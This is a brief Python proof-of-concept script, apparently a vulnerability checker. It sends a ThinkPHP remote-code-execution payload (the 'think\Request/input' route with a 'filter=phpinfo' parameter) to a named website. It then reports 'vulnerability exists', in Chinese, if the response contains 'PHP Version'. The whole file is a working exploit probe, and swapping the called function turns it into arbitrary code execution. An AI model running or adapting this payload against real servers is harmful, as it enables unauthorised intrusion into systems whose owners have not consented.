# coding=utf-8
# Author: HSJ
# 2023/9/18 16:10
import requests


url = "http://www.thinks332.com/"

payload = r"?s=index/\think\Request/input&filter=phpinfo&data=-1"


res = requests.get(url+payload)

html = res.content.decode("utf-8")

# 标记 PHP Version
flag = "PHP Version"

if flag in html:
    print("存在漏洞")
